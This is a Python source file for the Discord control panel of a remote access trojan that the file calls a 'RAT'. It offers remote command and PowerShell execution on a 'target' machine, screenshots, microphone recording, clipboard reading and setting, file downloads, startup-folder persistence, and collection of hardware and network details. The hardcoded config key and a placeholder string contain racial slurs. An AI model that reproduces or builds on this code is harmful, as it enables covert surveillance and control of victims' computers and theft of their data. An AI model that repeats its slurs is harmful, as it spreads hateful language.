import discord
from discord import app_commands
import config
from io import BytesIO
from core.logger import logger
from helpers.hardware import *
from datetime import datetime
import time
from core.logEntry import log_entries
from helpers.attach import *
from helpers.network import Network
from helpers.uninstall import uninstall
import helpers.source as source
from discord import ui

class confirm(discord.ui.View):
  def __init__(self):
      super().__init__(timeout=None)
         
  @discord.ui.button(label=f'yes im sure (delete)', style=discord.ButtonStyle.red, row=1, disabled=False)
  async def yes(self, interaction: discord.Interaction, button: discord.ui.Button):  
       try:
            await interaction.response.edit_message(content="bye.", embed=None, view=None)
            uninstall(True)
       except Exception as e:
          logger.error(e)
          
  @discord.ui.button(label=f'no', style=discord.ButtonStyle.gray, row=1, disabled=False)
  async def hellno(self, interaction: discord.Interaction, button: discord.ui.Button):  
       try:
            await interaction.message.delete()
       except Exception as e:
          logger.error(e)        



def home():
    embed = discord.Embed(
        title="Functions",
        description=(
            "**System**:\n"
            "> `shutdown`: Shutdown the system\n"
            "> `execute`: Executes a command or powershell script\n"
            "> `notification`: Sends a windows notification\n"
            "> `wallpaper`: Change system wallpaper (`12MB MAX` png, jpg, jpeg, bmp)\n"
            "> `files`: File explorer (`8MB MAX` File download)\n"
            "**Sound**\n"
            "> `volume`: Changes system volume `(0-100%)`\n"
            "> `playsound`: Plays a **.wav** sound `10MB MAX`\n"
            "> `tts`: Plays a text to speech sound using windows tts engine\n"
            "> `beep`: Play a `3.5` seconds long beep at `1000Hz`\n"
            "> `record`: Record mic audio (max 100 seconds) with ability to playback\n"
            "**Misc**\n"
            "> `ping`: Ping the bot *(ref: 0-450ms)*\n"
            "> `screenshot`: Takes a screenshot\n"
            "> `type`: Type a message with givin wpm *(words per minute)*\n"
            "**Advanced**\n"
            "> `clipboard`: Get or set clipboard contents\n"
            "> `processes`: List running processes\n"
        ),
        color=config.embedcolor
    )
    embed.add_field(name="Useful scripts", value="**`ALT+F4` PS** (classic):\n```(New-Object -ComObject WScript.Shell).SendKeys('%{F4}')```\n**`BEEP` PS**:\n```[console]::beep(1000, 500)``` *arg1: freq, arg2: time(ms)*", inline=False)
    embed.set_footer(text=f"Commands grouped in /functins | {config.version}")
    embed.set_thumbnail(url="https://c.tenor.com/Sumg6_XEn5QAAAAd/tenor.gif")
    return embed




class Dropper(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label='Functions', description='Functions list (main menu)', emoji='📜', value="fun"),
            discord.SelectOption(label='Info', description='View current target hardware & system/rat properties', emoji='🔋', value="res"),
            discord.SelectOption(label='Log', description='Access the \"thing\"\'s logs', emoji='📝', value="log"),
            discord.SelectOption(label='Attach', description='Attempt attaching to the startup folder', emoji='📎', value="attach"),
            discord.SelectOption(label='Uninstall', description='Delete the \"thing\" from the target completely', emoji='❌', value="remove"), 
            discord.SelectOption(label='Edit/view Config source', description='Edit the source of the json configuration file', emoji='⚙', value="config"), 
        ]
    
        super().__init__(placeholder='cool droppa', options=options, min_values=1, max_values=1)

    async def callback(self, interaction: discord.Interaction):
        try:
          so = self.values[0]
          if so == "fun":
            embed = home()
            await interaction.response.edit_message(embed=embed, view=Dropperview())
          elif so == "res":
            embed = discord.Embed(description=f"⏳ | Fetching data...", color=discord.Color.orange())
            m = await interaction.response.edit_message(embed=embed, view=None)
            cpu = CPU()
            gpu = GPU()
            mems = Memory()  
            disks = Disk()
            oss = get_os()
            description=(
                "**CPU**:\n"
                f"> **Name**: {cpu.name} (`{cpu.get_speed()}`GHz)\n"
                f"> **Cores**: `{cpu.cores}`\n"
                f"> **Threads**: `{cpu.threads}`\n"
                f"> **Usage** *(at <t:{int(time.time())}:T>)*: `{cpu.get_usage()}`%\n"
                "**GPU**\n"
            )
            for idx, gpu_info in enumerate(gpu.gpus):
                description += f"> **GPU {idx}**: {gpu_info['name']} (VRAM:` {gpu_info['vram'] if gpu_info['vram'] != 0 else '??'}GB`)\n"
                
            description += (
                "**Memory (RAM)**\n"
            )
            
            for stick, info in enumerate(mems.sticks):
                description += f"> **Stick {stick}**: `{info['size_gb']}GB {info['type']}`\n"
                
                
            description += (        
                "**Disks**\n"
            )
            
            for disk in disks.disks:
                description += f"> **Disk {disk['name']}** `{disk['size_gb']}GB` (`{disk['free_gb']}GB` free)\n"
                
            attached = isAttached()    
            description += (
                "**OS & RAT**\n"
                f"> **Name**: {oss['os']} {oss['release']}\n"
                f"> **Version**: `{oss['version']}`\n"
                f"> **Architecture**: `{oss['arch']}`\n"
                f"> **Computer**: {oss['computer']} (user: {oss['current_user']})\n"
                f"> **Architecture**: `{oss['arch']}`\n"
                f"> **RAT attached?** {'yes' if attached else 'no'}\n"
                f"> **RAT Attach shortcut**: {config.attach_shortcut_name}\n"
                f"> **RAT Version**: `{config.version}`"
            )    
                
            embed = discord.Embed(title="Resources", color=config.embedcolor)
            embed.description = description
            embed.set_footer(text=f"Some info may not be found | {config.version}")
            msg = await interaction.channel.fetch_message(m.message_id)
            if msg:
              await msg.edit(embed=embed, view=Dropperview(network=Network()))
            
            
          elif so == "log":
              lC = ""
              for l in log_entries:
                  lC += f"{l}\n"
              log_bytes = BytesIO(lC.encode("utf-8"))
              log_bytes.seek(0)  
              log_file = discord.File(log_bytes, filename=f"log_{datetime.now().date()}.log")
              ihatediscord = lC[:1950] + "..." if len(lC) > 1950 else lC
              embed = discord.Embed(title="Log", description=f"```{ihatediscord}```\n*(low level logs may be hidden)*", color=config.embedcolor)
              embed.set_footer(text=f"Log file {datetime.now().date()}")
              await interaction.response.edit_message(embed=embed, view=Dropperview(log=log_file)) 
          elif so == "attach":
              embed = discord.Embed(description=f"⏳ Attaching...", color=discord.Color.orange())
              m =await interaction.response.edit_message(embed=embed, view=None)
              s, mm = attach()
              msg = await interaction.channel.fetch_message(m.message_id)
              if s == True:
                embed = discord.Embed(title="Success", description=f"RAT has been attached successfully", color=config.embedcolor)  
              else:  
                embed = discord.Embed(title="Attach failed", description=f"RAT has failed to attach\n> Error: `{mm}`", color=config.embederrorcolor) 
              await msg.edit(embed=embed, view=Dropperview())         
          elif so == "remove":
              embed = discord.Embed(description=f"⭕ | ARE YOU 100% sure??", color=discord.Color.orange())  
              await interaction.response.send_message(embed=embed, view=confirm())           
          elif so == "config":
            rawdata = ""
            rawdata = source.read()
            data = source.dec(rawdata, "ihateniggers1940_1800")
            
            tokenstr = "\n> ".join(f"`\"{token}\"`" for token in data['tokens'])
            if not tokenstr:
                tokenstr = "*empty*"
            embed = discord.Embed(title="Config source", description=f"Current stamped version: `{data['version']}`\n**Tokens**:\n> {tokenstr}", color=config.embedcolor)
            await interaction.response.edit_message(embed=embed, view=Dropperview(config=True))
          else:    
              await interaction.response.send_message("soon inshallah", ephemeral=True)     
              
                     
        except Exception as e:
            await Bot.error(interaction, Bot, e)
            
            
class Log(discord.ui.Button):
    def __init__(self, log):
        self.log = log
        super().__init__(
            label="Get log",
            style=discord.ButtonStyle.primary,
        )

    async def callback(self, interaction: discord.Interaction):   
        await interaction.response.send_message(file=self.log)
        
class Refresh(discord.ui.Button):
    def __init__(self):
        super().__init__(
            label="Refresh",
            style=discord.ButtonStyle.gray,
        )

    async def callback(self, interaction: discord.Interaction):   
         lC = ""
         for l in log_entries:
             lC += f"{l}\n"
         log_bytes = BytesIO(lC.encode("utf-8"))
         log_bytes.seek(0)  
         log_file = discord.File(log_bytes, filename=f"log_{datetime.now().date()}.log")
         ihatediscord = lC[:1950] + "..." if len(lC) > 1950 else lC
         embed = discord.Embed(title="Log", description=f"```{ihatediscord}```\n*(low level logs may be hidden)*", color=config.embedcolor)
         embed.set_footer(text=f"Log file {datetime.now().date()}")
         await interaction.response.edit_message(embed=embed, view=Dropperview(log=log_file))
                 
class networkbtn(discord.ui.Button):
    def __init__(self, network: Network):
        self.network = network
        super().__init__(
            label="Network info",
            style=discord.ButtonStyle.primary,
            emoji="🌐"
        )

    async def callback(self, interaction: discord.Interaction):   
        description = (
            "**Interface**\n"
            f"> **SSID**: {self.network.ssid}\n"
            f"> **Protocol**: `{self.network.protocol}`\n"
            f"> **Security type**: `{self.network.security_type}`\n"
            f"> **Network band**: {self.network.network_band}\n"
            f"> **Network channel**: `{self.network.network_channel}`\n"
            f"> **Link speed (Rx/Tx)**: `{self.network.link_speed}`\n"
            f"> **Signal strength**: `{self.network.signal}`\n"
            "**IP & DNS**\n"
            f"> **IPv4 address**: `{self.network.ipv4_address}`\n"
            f"> **IPv4 DNS servers**: `{', '.join(self.network.ipv4_dns_servers) if self.network.ipv4_dns_servers else 'N/A'}`\n"
            f"> **Public IP**: `{self.network.public_ip}`\n"
            "**Driver**\n"
            f"> **Manufacturer**: {self.network.manufacturer}\n"
            f"> **Description**: {self.network.description}\n"
            f"> **Driver version**: `{self.network.driver_version}`"
        )
        embed = discord.Embed(title="Network", description=description, color=config.embedcolor)
        embed.set_footer(text=f"Reclicking the button won't refresh")
        await interaction.response.send_message(embed=embed, ephemeral=True)         
            
            


class tokenmodal(ui.Modal, title='Add token'): 
       def __init__(self):
          super().__init__()

       text = ui.TextInput(label='Token', max_length=128, required=True, placeholder="Mtmnigga1-69")

       async def on_submit(self, interaction: discord.Interaction):
           try:
             embed = discord.Embed(description=f"Saving...", color=discord.Color.orange())
             await interaction.response.edit_message(embed=embed, view=None)
             rawdata = source.read()
             if rawdata:
               cookeddata = source.dec(rawdata, "ihateniggers1940_1800")
               cookeddata['tokens'].append(self.text.value)
               cookedsrc = source.enc(cookeddata, "ihateniggers1940_1800")
               source.write(cookedsrc)
               tokenstr = "\n> ".join(f"`\"{token}\"`" for token in cookeddata['tokens'])
               embed = discord.Embed(title="Config source", description=f"Current stamped version: `{cookeddata['version']}`\n**Tokens**:\n> {tokenstr}", color=config.embedcolor)
               await interaction.message.edit(embed=embed, view=Dropperview(config=True))
             else:
                 embed = discord.Embed(description=f"❌ | Failed to get source file", color=config.embederrorcolor)
                 await interaction.response.send_message(embed=embed, ephemeral=True)
           except Exception as e:
               await Bot.error(interaction, Bot, e)  
            
class addtoken(discord.ui.Button):
    def __init__(self):
        super().__init__(
            label="Add token",
            style=discord.ButtonStyle.primary,
        )

    async def callback(self, interaction: discord.Interaction):   
        await interaction.response.send_modal(tokenmodal())  
            
class Dropperview(discord.ui.View):
    def __init__(self, log=None, network=None, config=False):
        super().__init__(timeout=None) 
        self.add_item(Dropper())
        if log:
            self.add_item(Log(log))
            self.add_item(Refresh())
        if network:
            self.add_item(networkbtn(network))    
        if config:
            self.add_item(addtoken())    
            
        

@app_commands.command(name="panel", description="Control panel")
async def command(interaction: discord.Interaction):
    embed = home()
    await interaction.response.send_message(embed=embed, view=Dropperview())

async def setup(bot):
    global Bot 
    Bot = bot
    bot.tree.add_command(command)
